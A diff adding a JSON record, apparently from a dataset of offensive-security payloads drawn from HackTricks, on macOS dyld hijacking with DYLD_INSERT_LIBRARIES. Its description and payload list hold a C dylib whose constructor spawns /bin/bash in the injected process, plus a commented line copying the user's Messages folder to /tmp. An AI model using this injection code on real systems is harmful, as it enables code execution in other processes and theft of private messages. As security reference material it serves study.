@@ -1,0 +1,27 @@
+{
+  "id": "macos_hardening_e3405eb4f1e5",
+  "category": "macos-hardening",
+  "title": "macos dyld hijacking and dyld insert libraries",
+  "description": "# macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\n## DYLD_INSERT_LIBRARIES Basic example\n\n**Library to inject** to execute a shell:\n\n```c\n// gcc -dynamiclib -o inject.dylib inject.c\n\n#include <syslog.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n__attribute__((constructor))\n\nvoid myconstructor(int argc, const char **argv)\n{\n    syslog(LOG_ERR, \"[+] dylib injected in %s\\n\", argv[0]);\n    printf(\"[+] dylib injected in %s\\n\", ar",
+  "payloads": [
+    "# macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES",
+    "{{#include ../../../../banners/hacktricks-training.md}}",
+    "## DYLD_INSERT_LIBRARIES Basic example",
+    "**Library to inject** to execute a shell:",
+    "// gcc -dynamiclib -o inject.dylib inject.c",
+    "#include <syslog.h>",
+    "#include <stdio.h>",
+    "#include <unistd.h>",
+    "#include <stdlib.h>",
+    "__attribute__((constructor))",
+    "void myconstructor(int argc, const char **argv)",
+    "syslog(LOG_ERR, \"[+] dylib injected in %s\\n\", argv[0]);",
+    "printf(\"[+] dylib injected in %s\\n\", argv[0]);",
+    "execv(\"/bin/bash\", 0);",
+    "//system(\"cp -r ~/Library/Messages/ /tmp/Messages/\");"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md"
+  ]
+}
